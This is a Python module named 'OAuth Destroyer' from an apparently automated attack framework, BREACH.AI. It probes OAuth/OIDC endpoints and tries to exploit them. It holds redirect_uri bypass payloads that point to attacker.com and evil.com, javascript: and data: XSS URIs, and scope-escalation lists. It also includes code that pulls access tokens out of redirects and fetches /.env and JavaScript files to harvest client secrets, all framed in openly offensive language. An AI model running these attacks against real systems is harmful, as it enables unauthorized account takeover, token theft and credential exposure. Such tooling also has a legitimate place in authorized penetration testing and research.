"""
BREACH.AI - OAuth Destroyer

Comprehensive OAuth 2.0 / OpenID Connect attack module.
Every OAuth implementation is broken - we just need to find how.

Attack Categories:
1. Redirect URI Manipulation - Open redirects, parameter pollution
2. State Bypass - CSRF via missing/weak state
3. Scope Escalation - Request more than allowed
4. Token Theft - Leak tokens via referrer, logs
5. PKCE Bypass - Code verifier attacks
6. Client Impersonation - Steal client credentials
7. Token Reuse - Cross-application token abuse
"""

import hashlib
import base64
import secrets
import re
from dataclasses import dataclass
from typing import Optional
from urllib.parse import urlencode, urlparse, parse_qs, urljoin

from backend.breach.attacks.base import AttackResult, BaseAttack
from backend.breach.core.memory import AccessLevel, Severity
from backend.breach.utils.logger import logger


@dataclass
class OAuthEndpoints:
    """Discovered OAuth endpoints."""
    authorization: Optional[str] = None
    token: Optional[str] = None
    userinfo: Optional[str] = None
    jwks: Optional[str] = None
    discovery: Optional[str] = None
    register: Optional[str] = None


@dataclass
class OAuthConfig:
    """Discovered OAuth configuration."""
    client_id: Optional[str] = None
    redirect_uri: Optional[str] = None
    scopes: list[str] = None
    response_types: list[str] = None
    grant_types: list[str] = None


class OAuthDestroyer(BaseAttack):
    """
    OAuth DESTROYER - Comprehensive OAuth/OIDC exploitation.

    OAuth is complex. Complexity breeds vulnerabilities.
    This module exploits every OAuth misconfiguration.
    """

    name = "OAuth Destroyer"
    attack_type = "oauth_attack"
    description = "Comprehensive OAuth 2.0/OIDC vulnerability exploitation"
    severity = Severity.CRITICAL
    owasp_category = "A07:2021 Identification and Authentication Failures"
    cwe_id = 287

    # Redirect URI bypass techniques
    REDIRECT_BYPASSES = [
        # Subdomain tricks
        "{base}.attacker.com",
        "attacker.com.{domain}",
        "attacker.com%2f{domain}",

        # Path manipulation
        "{uri}/../attacker.com",
        "{uri}/../../attacker.com",
        "{uri}/.attacker.com",
        "{uri}@attacker.com",
        "{uri}#@attacker.com",

        # URL encoding tricks
        "{uri}%2f%2fattacker.com",
        "{uri}%252f%252fattacker.com",

        # Null byte
        "{uri}%00attacker.com",
        "{uri}%0d%0aattacker.com",

        # Fragment tricks
        "{uri}#attacker.com",

        # Host header tricks
        "{scheme}://attacker.com:{port}{path}",
    ]

    # Scope escalation attempts
    SCOPE_ESCALATIONS = [
        # Admin scopes
        "admin", "admin:read", "admin:write",
        "administrator", "superuser",

        # Full access
        "all", "*", "full", "full_access",

        # Common sensitive scopes
        "read:user", "write:user", "user:email", "user:all",
        "read:org", "write:org", "org:admin",
        "repo", "repo:all", "gist", "gist:write",
        "openid", "profile", "email", "offline_access",

        # API scopes
        "api", "api:read", "api:write", "api:admin",

        # Finance related
        "payment", "billing", "transaction",
    ]

    def get_payloads(self) -> list[str]:
        return self.SCOPE_ESCALATIONS

    async def check(
        self,
        url: str,
        parameter: Optional[str] = None,
        method: str = "GET",
        **kwargs
    ) -> bool:
        """Check if OAuth is in use."""
        response = await self.http_client.get(url)

        # OAuth indicators
        oauth_indicators = [
            "oauth", "authorize", "client_id", "redirect_uri",
            "response_type", "scope", "state", "code",
            "access_token", "refresh_token", "id_token",
            "openid-connect", "oidc", ".well-known/openid"
        ]

        body_lower = response.body.lower()
        return any(ind in body_lower for ind in oauth_indicators)

    async def exploit(
        self,
        url: str,
        parameter: Optional[str] = None,
        method: str = "GET",
        **kwargs
    ) -> AttackResult:
        """Execute comprehensive OAuth attacks."""
        result = self._create_result(False, url, parameter)

        # Discover OAuth endpoints
        endpoints = await self._discover_endpoints(url)
        config = await self._discover_config(url, endpoints)

        if not endpoints.authorization:
            result.details = "No OAuth endpoints discovered"
            return result

        logger.info(f"[OAuth] Found authorization endpoint: {endpoints.authorization}")

        # Attack 1: Open Redirect via redirect_uri
        redirect_result = await self._attack_redirect_uri(url, endpoints, config)
        if redirect_result:
            result.success = True
            result.payload = redirect_result["payload"]
            result.details = f"Open redirect in OAuth: {redirect_result['type']}"
            result.add_evidence(
                "oauth_redirect",
                "Redirect URI validation bypass",
                redirect_result["payload"]
            )
            return result

        # Attack 2: Missing State (CSRF)
        state_result = await self._attack_missing_state(url, endpoints, config)
        if state_result:
            result.success = True
            result.details = "OAuth CSRF - state parameter not validated"
            result.add_evidence(
                "oauth_csrf",
                "Missing state parameter validation enables CSRF",
                state_result["details"]
            )
            return result

        # Attack 3: Scope Escalation
        scope_result = await self._attack_scope_escalation(url, endpoints, config)
        if scope_result:
            result.success = True
            result.payload = scope_result["scope"]
            result.details = f"Scope escalation: {scope_result['scope']}"
            result.access_gained = AccessLevel.ADMIN
            result.add_evidence(
                "oauth_scope_escalation",
                "Unauthorized scope granted",
                scope_result["scope"]
            )
            return result

        # Attack 4: Token in URL Fragment/Query
        token_leak_result = await self._attack_token_leakage(url, endpoints, config)
        if token_leak_result:
            result.success = True
            result.payload = token_leak_result["token"][:50] + "..."
            result.details = f"Token leaked via {token_leak_result['method']}"
            result.access_gained = AccessLevel.USER
            result.add_evidence(
                "oauth_token_leak",
                f"Access token exposed in {token_leak_result['method']}",
                token_leak_result["token"][:100]
            )
            return result

        # Attack 5: Authorization Code Injection
        code_result = await self._attack_code_injection(url, endpoints, config)
        if code_result:
            result.success = True
            result.details = "Authorization code injection possible"
            result.add_evidence(
                "oauth_code_injection",
                "Authorization code can be injected from attacker session",
                code_result["details"]
            )
            return result

        # Attack 6: PKCE Downgrade
        pkce_result = await self._attack_pkce_bypass(url, endpoints, config)
        if pkce_result:
            result.success = True
            result.details = f"PKCE bypass: {pkce_result['type']}"
            result.add_evidence(
                "oauth_pkce_bypass",
                "PKCE protection can be bypassed",
                pkce_result["details"]
            )
            return result

        # Attack 7: Implicit Grant Token Theft
        implicit_result = await self._attack_implicit_grant(url, endpoints, config)
        if implicit_result:
            result.success = True
            result.details = "Implicit grant enabled - tokens exposed in URL"
            result.add_evidence(
                "oauth_implicit_grant",
                "Implicit grant allows token theft via URL",
                implicit_result["details"]
            )
            return result

        # Attack 8: Client Credential Exposure
        cred_result = await self._attack_client_credentials(url, endpoints, config)
        if cred_result:
            result.success = True
            result.payload = cred_result["client_id"]
            result.details = f"Client credentials exposed: {cred_result['type']}"
            result.add_evidence(
                "oauth_client_creds",
                "OAuth client credentials discovered",
                f"client_id: {cred_result['client_id']}"
            )
            return result

        return result

    async def _discover_endpoints(self, url: str) -> OAuthEndpoints:
        """Discover OAuth endpoints."""
        endpoints = OAuthEndpoints()
        parsed = urlparse(url)
        base_url = f"{parsed.scheme}://{parsed.netloc}"

        # Common OAuth endpoint paths
        discovery_paths = [
            "/.well-known/openid-configuration",
            "/.well-known/oauth-authorization-server",
            "/oauth/.well-known/openid-configuration",
            "/auth/.well-known/openid-configuration",
        ]

        for path in discovery_paths:
            try:
                discovery_url = urljoin(base_url, path)
                response = await self.http_client.get(discovery_url)

                if response.status_code == 200:
                    import json
                    config = json.loads(response.body)

                    endpoints.discovery = discovery_url
                    endpoints.authorization = config.get("authorization_endpoint")
                    endpoints.token = config.get("token_endpoint")
                    endpoints.userinfo = config.get("userinfo_endpoint")
                    endpoints.jwks = config.get("jwks_uri")
                    endpoints.register = config.get("registration_endpoint")

                    logger.info(f"[OAuth] Discovery document found at {discovery_url}")
                    return endpoints

            except Exception:
                continue

        # Manual discovery if no OIDC discovery
        auth_paths = [
            "/oauth/authorize", "/oauth2/authorize", "/authorize",
            "/auth/authorize", "/oauth/auth", "/connect/authorize",
            "/api/oauth/authorize", "/v1/oauth/authorize",
        ]

        token_paths = [
            "/oauth/token", "/oauth2/token", "/token",
            "/auth/token", "/connect/token", "/api/oauth/token",
        ]

        for path in auth_paths:
            try:
                auth_url = urljoin(base_url, path)
                response = await self.http_client.get(auth_url)

                # 400/302 might indicate valid endpoint
                if response.status_code in [200, 302, 400, 401]:
                    endpoints.authorization = auth_url
                    break
            except Exception:
                continue

        for path in token_paths:
            try:
                token_url = urljoin(base_url, path)
                response = await self.http_client.post(token_url, data={})

                if response.status_code in [200, 400, 401]:
                    endpoints.token = token_url
                    break
            except Exception:
                continue

        return endpoints

    async def _discover_config(self, url: str, endpoints: OAuthEndpoints) -> OAuthConfig:
        """Discover OAuth configuration from the target."""
        config = OAuthConfig(scopes=[])

        # Try to find client_id and redirect_uri in page source
        response = await self.http_client.get(url)

        # Find client_id
        client_id_patterns = [
            r'client_id["\s:=]+([a-zA-Z0-9_-]+)',
            r'clientId["\s:=]+([a-zA-Z0-9_-]+)',
            r'OAUTH_CLIENT_ID["\s:=]+([a-zA-Z0-9_-]+)',
        ]

        for pattern in client_id_patterns:
            match = re.search(pattern, response.body)
            if match:
                config.client_id = match.group(1)
                break

        # Find redirect_uri
        redirect_patterns = [
            r'redirect_uri["\s:=]+([^\s"\'&]+)',
            r'redirectUri["\s:=]+([^\s"\'&]+)',
            r'callback["\s:=]+([^\s"\'&]+)',
        ]

        for pattern in redirect_patterns:
            match = re.search(pattern, response.body)
            if match:
                config.redirect_uri = match.group(1)
                break

        return config

    async def _attack_redirect_uri(
        self,
        url: str,
        endpoints: OAuthEndpoints,
        config: OAuthConfig
    ) -> Optional[dict]:
        """Test for open redirect via redirect_uri manipulation."""
        if not endpoints.authorization:
            return None

        logger.debug("[OAuth] Testing redirect_uri bypasses...")

        original_redirect = config.redirect_uri or url
        parsed = urlparse(original_redirect)

        bypass_payloads = [
            # Subdomain bypass
            f"https://evil.{parsed.netloc}",
            f"https://{parsed.netloc}.evil.com",

            # Path bypass
            f"{original_redirect}/../../../evil.com",
            f"{original_redirect}//evil.com",
            f"{original_redirect}@evil.com",
            f"{original_redirect}#.evil.com",

            # Encoding bypass
            f"{original_redirect}%2f%2fevil.com",
            f"{original_redirect}%00evil.com",

            # Localhost bypass
            f"http://localhost/callback",
            f"http://127.0.0.1/callback",

            # Data URI
            f"data:text/html,<script>alert(1)</script>",

            # JavaScript URI
            f"javascript:alert(document.domain)",
        ]

        for bypass in bypass_payloads:
            params = {
                "client_id": config.client_id or "test",
                "redirect_uri": bypass,
                "response_type": "code",
                "scope": "openid",
                "state": "test123",
            }

            auth_url = f"{endpoints.authorization}?{urlencode(params)}"

            try:
                response = await self.http_client.get(auth_url, follow_redirects=False)

                # Check if redirect was accepted
                if response.status_code in [302, 303, 307]:
                    location = response.headers.get("Location", "")
                    if "evil" in location or bypass in location:
                        return {
                            "type": "Open Redirect",
                            "payload": bypass
                        }

                # Check if no error about invalid redirect_uri
                if response.status_code == 200:
                    error_indicators = ["invalid_redirect", "redirect_uri_mismatch", "invalid redirect"]
                    if not any(ind in response.body.lower() for ind in error_indicators):
                        return {
                            "type": "Redirect URI not validated",
                            "payload": bypass
                        }

            except Exception:
                continue

        return None

    async def _attack_missing_state(
        self,
        url: str,
        endpoints: OAuthEndpoints,
        config: OAuthConfig
    ) -> Optional[dict]:
        """Test for missing state parameter (CSRF)."""
        if not endpoints.authorization:
            return None

        logger.debug("[OAuth] Testing state parameter validation...")

        # Request without state
        params = {
            "client_id": config.client_id or "test",
            "redirect_uri": config.redirect_uri or url,
            "response_type": "code",
            "scope": "openid",
            # No state parameter
        }

        auth_url = f"{endpoints.authorization}?{urlencode(params)}"
        response = await self.http_client.get(auth_url)

        # If no error about missing state, it's vulnerable
        if response.status_code in [200, 302]:
            error_indicators = ["state", "missing", "required", "csrf"]
            if not any(ind in response.body.lower() for ind in error_indicators):
                return {"details": "State parameter not required - CSRF possible"}

        return None

    async def _attack_scope_escalation(
        self,
        url: str,
        endpoints: OAuthEndpoints,
        config: OAuthConfig
    ) -> Optional[dict]:
        """Test for unauthorized scope grants."""
        if not endpoints.authorization:
            return None

        logger.debug("[OAuth] Testing scope escalation...")

        for scope in self.SCOPE_ESCALATIONS:
            params = {
                "client_id": config.client_id or "test",
                "redirect_uri": config.redirect_uri or url,
                "response_type": "code",
                "scope": f"openid {scope}",
                "state": secrets.token_hex(16),
            }

            auth_url = f"{endpoints.authorization}?{urlencode(params)}"
            response = await self.http_client.get(auth_url)

            # Check if scope was accepted without error
            if response.status_code == 200:
                error_indicators = ["invalid_scope", "scope", "unauthorized", "denied"]
                body_lower = response.body.lower()

                if not any(ind in body_lower for ind in error_indicators):
                    # Check if scope appears in consent screen
                    if scope in response.body:
                        return {"scope": scope, "granted": True}

        return None

    async def _attack_token_leakage(
        self,
        url: str,
        endpoints: OAuthEndpoints,
        config: OAuthConfig
    ) -> Optional[dict]:
        """Test for token leakage via URL, referrer, etc."""
        logger.debug("[OAuth] Testing token leakage...")

        # Check if implicit grant is enabled (tokens in URL)
        if endpoints.authorization:
            params = {
                "client_id": config.client_id or "test",
                "redirect_uri": config.redirect_uri or url,
                "response_type": "token",  # Implicit grant
                "scope": "openid",
                "state": "test123",
            }

            auth_url = f"{endpoints.authorization}?{urlencode(params)}"
            response = await self.http_client.get(auth_url, follow_redirects=False)

            if response.status_code in [302, 303]:
                location = response.headers.get("Location", "")
                if "access_token=" in location or "#access_token=" in location:
                    # Extract token
                    token_match = re.search(r'access_token=([^&\s]+)', location)
                    if token_match:
                        return {
                            "method": "URL fragment (implicit grant)",
                            "token": token_match.group(1)
                        }

        return None

    async def _attack_code_injection(
        self,
        url: str,
        endpoints: OAuthEndpoints,
        config: OAuthConfig
    ) -> Optional[dict]:
        """Test for authorization code injection."""
        # This requires testing if an attacker's code can be used
        # to authenticate as victim
        logger.debug("[OAuth] Testing code injection...")

        # We can check if code binding is enforced
        if endpoints.token:
            # Try to exchange a fake code
            data = {
                "grant_type": "authorization_code",
                "code": "INJECTED_CODE_123",
                "client_id": config.client_id or "test",
                "redirect_uri": config.redirect_uri or url,
            }

            response = await self.http_client.post(endpoints.token, data=data)

            # Check the error response
            if response.status_code == 400:
                # Good - code is rejected
                pass
            elif response.status_code == 200:
                # Bad - code accepted!
                return {"details": "Arbitrary code accepted"}

        return None

    async def _attack_pkce_bypass(
        self,
        url: str,
        endpoints: OAuthEndpoints,
        config: OAuthConfig
    ) -> Optional[dict]:
        """Test for PKCE bypass vulnerabilities."""
        if not endpoints.authorization:
            return None

        logger.debug("[OAuth] Testing PKCE bypass...")

        # Test 1: PKCE not required
        params = {
            "client_id": config.client_id or "test",
            "redirect_uri": config.redirect_uri or url,
            "response_type": "code",
            "scope": "openid",
            "state": "test123",
            # No code_challenge
        }

        auth_url = f"{endpoints.authorization}?{urlencode(params)}"
        response = await self.http_client.get(auth_url)

        if response.status_code == 200:
            if "code_challenge" not in response.body.lower():
                return {
                    "type": "PKCE not required",
                    "details": "Authorization proceeds without PKCE"
                }

        # Test 2: Plain code_challenge_method
        code_verifier = secrets.token_urlsafe(32)
        params["code_challenge"] = code_verifier
        params["code_challenge_method"] = "plain"

        auth_url = f"{endpoints.authorization}?{urlencode(params)}"
        response = await self.http_client.get(auth_url)

        if response.status_code == 200 and "error" not in response.body.lower():
            return {
                "type": "Plain PKCE method allowed",
                "details": "S256 not enforced - code_verifier = code_challenge"
            }

        return None

    async def _attack_implicit_grant(
        self,
        url: str,
        endpoints: OAuthEndpoints,
        config: OAuthConfig
    ) -> Optional[dict]:
        """Check if insecure implicit grant is enabled."""
        if not endpoints.authorization:
            return None

        logger.debug("[OAuth] Testing implicit grant...")

        params = {
            "client_id": config.client_id or "test",
            "redirect_uri": config.redirect_uri or url,
            "response_type": "token",
            "scope": "openid",
            "state": "test123",
        }

        auth_url = f"{endpoints.authorization}?{urlencode(params)}"
        response = await self.http_client.get(auth_url)

        # If we get a login/consent page, implicit grant is enabled
        if response.status_code == 200:
            if "error" not in response.body.lower() and "unsupported" not in response.body.lower():
                return {
                    "details": "Implicit grant (response_type=token) is enabled. "
                              "Tokens will be exposed in URL fragment."
                }

        return None

    async def _attack_client_credentials(
        self,
        url: str,
        endpoints: OAuthEndpoints,
        config: OAuthConfig
    ) -> Optional[dict]:
        """Look for exposed client credentials."""
        logger.debug("[OAuth] Looking for exposed client credentials...")

        # Search for client credentials in common locations
        locations = [
            url,
            urljoin(url, "/config"),
            urljoin(url, "/settings"),
            urljoin(url, "/.env"),
            urljoin(url, "/config.js"),
            urljoin(url, "/app.js"),
            urljoin(url, "/main.js"),
        ]

        for loc in locations:
            try:
                response = await self.http_client.get(loc)

                if response.status_code == 200:
                    # Look for client_secret
                    secret_patterns = [
                        r'client_secret["\s:=]+([a-zA-Z0-9_-]{20,})',
                        r'clientSecret["\s:=]+([a-zA-Z0-9_-]{20,})',
                        r'OAUTH_CLIENT_SECRET["\s:=]+([a-zA-Z0-9_-]{20,})',
                    ]

                    for pattern in secret_patterns:
                        match = re.search(pattern, response.body)
                        if match:
                            return {
                                "type": "Client secret exposed",
                                "client_id": config.client_id or "unknown",
                                "location": loc
                            }

            except Exception:
                continue

        return None
